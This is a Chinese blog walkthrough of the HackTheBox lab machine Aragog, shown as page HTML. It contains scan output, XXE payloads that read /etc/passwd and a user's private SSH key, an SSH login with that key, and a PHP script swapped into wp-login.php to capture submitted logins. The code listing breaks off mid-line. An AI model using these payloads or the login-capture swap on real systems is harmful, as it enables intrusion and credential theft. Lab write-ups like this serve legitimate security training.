@@ -1,0 +1,659 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="第一步：枚举123456789101112131415161718192021222324252627282930313233└─# nmap -sV -O -F --version-light 10.10.10.78Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-18 08:23 EDTStats: 0:00:03 elapsed; 0 ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Aragog">
+<meta property="og:url" content="http://example.com/2023/04/20/HTB-Aragog/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="第一步：枚举123456789101112131415161718192021222324252627282930313233└─# nmap -sV -O -F --version-light 10.10.10.78Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-18 08:23 EDTStats: 0:00:03 elapsed; 0 ho">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5bf1068a438f4a1bba8de672f04082a3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6cba76bc161b4307ac70df07bb282273.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/263e236ffeb347cc8cd2efedcc00dc2d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/15a6fbabbedf4030b418851f43211166.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7c73754800ae4838b2880fd4094384bd.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/64aea065ea61478d831df4cd8c088917.png">
+<meta property="article:published_time" content="2023-04-20T15:33:27.625Z">
+<meta property="article:modified_time" content="2023-04-20T15:21:33.053Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/5bf1068a438f4a1bba8de672f04082a3.png">
+  
+  
+  
+  <title>HTB-Aragog - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB-Aragog"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          61 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HTB-Aragog</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="第一步：枚举"><a href="#第一步：枚举" class="headerlink" title="第一步：枚举"></a>第一步：枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># nmap -sV -O -F --version-light 10.10.10.78</span><br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 08:23 EDT<br>Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 33.33% <span class="hljs-keyword">done</span>; ETC: 08:23 (0:00:00 remaining)<br>Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 66.67% <span class="hljs-keyword">done</span>; ETC: 08:23 (0:00:03 remaining)<br>Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 0.00% <span class="hljs-keyword">done</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.78<br>Host is up (0.22s latency).<br>Not shown: 97 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.3<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.92%E=4%D=7/18%OT=21%CT=7%CU=40837%PV=Y%DS=2%DC=I%G=Y%TM=62D550C<br>OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=103%TI=Z%CI=I%II=I%TS=A)SEQ<br>OS:(SP=105%GCD=1%ISR=103%TI=Z%CI=I%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O<br>OS:3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=7120%W2=<br>OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSN<br>OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D<br>OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O<br>OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W<br>OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R<br>OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 2 hops<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 25.81 seconds<br></code></pre></td></tr></table></figure>
+<h2 id="第二步：获取用户访问权限"><a href="#第二步：获取用户访问权限" class="headerlink" title="第二步：	获取用户访问权限"></a>第二步：	获取用户访问权限</h2><p>可以看到21端口是ftp，是vsfted 3.0.3服务<br>22端口是ssh，<br>通过ftp文件传输协议，进行文件传输 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">└─<span class="hljs-comment"># ftp Anonymous@10.10.10.78             </span><br>Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.78</span>.<br><span class="hljs-number">220</span> (vsFTPd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span>)<br><span class="hljs-number">230</span> Login successful.<br>Remote system <span class="hljs-built_in">type</span> <span class="hljs-keyword">is</span> UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; ls<br><span class="hljs-number">229</span> Entering Extended Passive Mode (|||<span class="hljs-number">42880</span>|)<br><span class="hljs-number">150</span> Here comes the directory listing.<br>-r--r--r--    <span class="hljs-number">1</span> ftp      ftp            <span class="hljs-number">86</span> Dec <span class="hljs-number">21</span>  <span class="hljs-number">2017</span> test.txt<br><span class="hljs-number">226</span> Directory send OK.<br>ftp&gt; ls -a<br><span class="hljs-number">229</span> Entering Extended Passive Mode (|||<span class="hljs-number">46951</span>|)<br><span class="hljs-number">150</span> Here comes the directory listing.<br>drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Dec <span class="hljs-number">21</span>  <span class="hljs-number">2017</span> .<br>drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Dec <span class="hljs-number">21</span>  <span class="hljs-number">2017</span> ..<br>-r--r--r--    <span class="hljs-number">1</span> ftp      ftp            <span class="hljs-number">86</span> Dec <span class="hljs-number">21</span>  <span class="hljs-number">2017</span> test.txt<br><span class="hljs-number">226</span> Directory send OK.<br>ftp&gt; cat test.txt<br>?Invalid command.<br>ftp&gt; get test.txt<br>local: test.txt remote: test.txt<br><span class="hljs-number">229</span> Entering Extended Passive Mode (|||<span class="hljs-number">45066</span>|)<br><span class="hljs-number">150</span> Opening BINARY mode data connection <span class="hljs-keyword">for</span> test.txt (<span class="hljs-number">86</span> <span class="hljs-built_in">bytes</span>).<br><span class="hljs-number">100</span>% |********************************|    <span class="hljs-number">86</span>        <span class="hljs-number">2.15</span> MiB/s    <span class="hljs-number">00</span>:<span class="hljs-number">00</span> ETA<br><span class="hljs-number">226</span> Transfer complete.<br><span class="hljs-number">86</span> <span class="hljs-built_in">bytes</span> received <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> (<span class="hljs-number">0.39</span> KiB/s)<br></code></pre></td></tr></table></figure>
+<p>通过get test.txt将文件下载下来，test.txt的内容是</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">subnet_mask</span>&gt;</span>255.255.255.192<span class="hljs-tag">&lt;/<span class="hljs-name">subnet_mask</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>然后思路就卡住了，枚举的工具一般用dirbuster，gobuster，feroxbuster等。这次咱们用feroxbuster。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs p"># feroxbuster -u http://10.10.10.78/ -x php<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben &quot;epi&quot; Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://10.10.10.78/<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                           <br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 💲  Extensions            │ [php]<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>[&gt;-------------------] - 0s         1/60000   7h      found:0       errors:0 [&gt;-------------------] - 0s         2/60000   6h      found:0       errors:0 [&gt;-------------------] - 0s         3/60000   5h      found:0       errors:0 <br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/5bf1068a438f4a1bba8de672f04082a3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>访问<a target="_blank" rel="noopener" href="http://10.10.10.78/hosts.php">http://10.10.10.78/hosts.php</a><br><img src="https://img-blog.csdnimg.cn/6cba76bc161b4307ac70df07bb282273.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>burpsuite抓取包，结合之前test.php的xml，post重新发包<br><img src="https://img-blog.csdnimg.cn/263e236ffeb347cc8cd2efedcc00dc2d.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>成功得到回应，看起来像是一个子网计算器，我们伪造xml语句，构造XXE。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE  <span class="hljs-keyword">XXE</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">subnet_mask</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">subnet_mask</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/15a6fbabbedf4030b418851f43211166.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>回显中这一条信息<br>florian:x:1000:1000:florian,,,:&#x2F;home&#x2F;florian:&#x2F;bin&#x2F;bash<br>在home目录下用户是florian<br>打印该用户标志<br><img src="https://img-blog.csdnimg.cn/7c73754800ae4838b2880fd4094384bd.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="第三步：获取root权限"><a href="#第三步：获取root权限" class="headerlink" title="第三步：获取root权限"></a>第三步：获取root权限</h2><p>首先获取用户 florian 的私有 ssh 密钥，<br>该密钥存储在 &#x2F;home&#x2F;florian&#x2F;.ssh&#x2F;id_rsa</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE  <span class="hljs-keyword">XXE</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///home/florian/.ssh/id_rsa&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">subnet_mask</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">subnet_mask</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/64aea065ea61478d831df4cd8c088917.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>将id_rsa的内容复制粘贴到本地<br>然后ssh 密钥 florian用户身份登陆</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">└─<span class="hljs-comment"># ssh -i id_rsa florian@10.10.10.78</span><br>Last login: Fri Jan <span class="hljs-number">12</span> <span class="hljs-number">13</span>:<span class="hljs-number">56</span>:<span class="hljs-number">45</span> <span class="hljs-number">2018</span> <span class="hljs-keyword">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">florian@aragog:~$ cd /var/<br>florian@aragog:/var$ ls<br>backups  crash  lib    lock  mail     opt  snap   tmp<br>cache    ftp    local  log   metrics  run  spool  www<br>florian@aragog:/var$ cd www<br>florian@aragog:/var/www$ ls<br>html<br>florian@aragog:/var/www$ cd html<br>florian@aragog:/var/www/html$ ls<br>dev_wiki  hosts.php  index.html  zz_backup<br>florian@aragog:/var/www/html$ cd dev_wiki/<br>florian@aragog:/var/www/html/dev_wiki$ ls<br>index.php        wp-blog-header.php    wp-includes        wp-settings.php<br>license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php<br>readme.html      wp-config.php         wp-load.php        wp-trackback.php<br>wp-activate.php  wp-content            wp-login.php       xmlrpc.php<br>wp-admin         wp-cron.php           wp-mail.php<br></code></pre></td></tr></table></figure>
+<p>在这里发现wordpress框架文件<br>访问<a target="_blank" rel="noopener" href="http://10.10.10.78/dev_wiki/index.php">http://10.10.10.78/dev_wiki/index.php</a><br>网页不正常，而且10.10.10.78并没有进行域名解析<br>重定向将aragog添加到&#x2F;etc&#x2F;hosts 文件中，<br>在自己的命令端执行</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">┌──(root㉿kali)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─# echo <span class="hljs-string">&#x27;10.10.10.78 aragog&#x27;</span>  &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure>
+<p>看到正常的wordpress网站后，将wp-login.php的内容替换为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// https://gist.github.com/magnetikonline/650e30e485c0f91f2f40</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DumpHTTPRequestToFile</span> </span>&#123;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$targetFile</span></span>) </span>&#123;<br><br>		<span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<br>			<span class="hljs-string">&quot;%s %s %s\n\nHTTP headers:\n&quot;</span>,<br>			<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>],<br>			<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>],<br>			<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>]<br>		);<br><br>		<span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getHeaderList</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>			<span class="hljs-variable">$data</span> .= <span class="hljs-variable">$name</span> . <span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>		&#125;<br><br>		<span class="hljs-variable">$data</span> .= <span class="hljs-string">&quot;\nRequest body:\n&quot;</span>;<br><br>		<span class="hljs-title function_ invoke__">file_put_contents</span>(<br>			<span class="hljs-variable">$targetFile</span>,<br>			<span class="hljs-variable">$data</span> . <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span><br>		);<br><br>		<span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;Done!\n\n&quot;</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getHeaderList</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>		<span class="hljs-variable">$headerList</span> = [];<br>		<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>			<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^HTTP_/&#x27;</span>,<span class="hljs-variable">$name</span>)) &#123;<br>				<span class="hljs-comment">// convert HTTP_HEADER_NAME to Header-Name</span><br>				<span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>,<span class="hljs-number">5</span>),<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27; 